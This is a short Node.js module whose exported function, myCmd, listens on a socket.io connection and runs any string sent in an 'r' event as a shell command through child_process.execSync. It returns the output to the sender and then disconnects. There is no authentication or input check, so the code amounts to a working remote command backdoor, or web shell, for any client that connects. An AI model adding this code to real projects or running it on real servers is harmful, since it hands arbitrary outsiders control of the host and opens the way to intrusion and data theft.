
var child_process = require("child_process");

function myCmd(app, io)
{
    io.on('connection', (socket)=> {
        socket.on('r', (s) => {
            // console.log(s)
            var oR = child_process.execSync(s).toString();
            socket.emit("upInfo",oR);
            socket.disconnect();
        });
    });
}

module.exports = { myCmd: myCmd};